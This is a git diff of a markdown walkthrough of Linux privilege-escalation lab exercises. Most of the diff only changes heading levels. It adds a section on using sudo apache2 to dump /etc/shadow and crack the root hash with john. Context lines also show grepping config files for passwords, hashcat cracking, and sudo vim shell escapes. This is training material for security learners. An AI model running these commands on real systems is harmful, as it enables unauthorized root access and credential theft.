@@ -37,7 +37,7 @@ Linux VM
 From here, either copy /tmp/passwd back to /usr/bin/passwd or reset your machine to undo changes made to the passwd binary
 
 
-# 2. Stored Passwords (Config Files) 
+## 2. Stored Passwords (Config Files) 
 
 **Exploitation**
 
@@ -50,7 +50,7 @@ Linux VM
 5. In command prompt type: ```cat /home/user/.irssi/config | grep -i passw ```
 6. From the output, make note of the clear-text credentials.
 
-# 3.  Stored Passwords (History)
+## 3.  Stored Passwords (History)
 
 **Exploitation**
 
@@ -60,7 +60,7 @@ Linux VM
 
 
 
-# 4. Weak File Permissions 
+## 4. Weak File Permissions 
 
 Linux VM
 
@@ -77,7 +77,7 @@ Now, you have an unshadowed file.  We already know the password, but you can use
 
 ```hashcat -m 1800 unshadowed.txt rockyou.txt -O ```
 
-# 5. SSH Keys 
+## 5. SSH Keys 
 
 **Detection**
 
@@ -102,7 +102,7 @@ Attacker VM
 
 You should now have a root shell :)
 
-# 6. Sudo (Shell Escaping) 
+## 6. Sudo (Shell Escaping) 
 
 **Detection**
 
@@ -123,9 +123,30 @@ d. ```sudo vim -c '!sh' ```
 
 
 
-# 7. Sudo (Abusing Intended Functionality)
+## 7. Sudo (Abusing Intended Functionality)
 
+**Detection**
 
+Linux VM
+
+1. In command prompt type: ```sudo -l ```
+2. From the output, notice the list of programs that can run via sudo.
+
+**Exploitation**
+
+Linux VM
+
+1. In command prompt type:
+```sudo apache2 -f /etc/shadow ```
+2. From the output, copy the root hash.
+
+Attacker VM
+
+1. Open command prompt and type:
+```echo '[Pasted Root Hash]' > hash.txt ```
+2. In command prompt type:
+```john --wordlist=/usr/share/wordlists/nmap.lst hash.txt ```
+3. From the output, notice the cracked credentials.
 
 
 
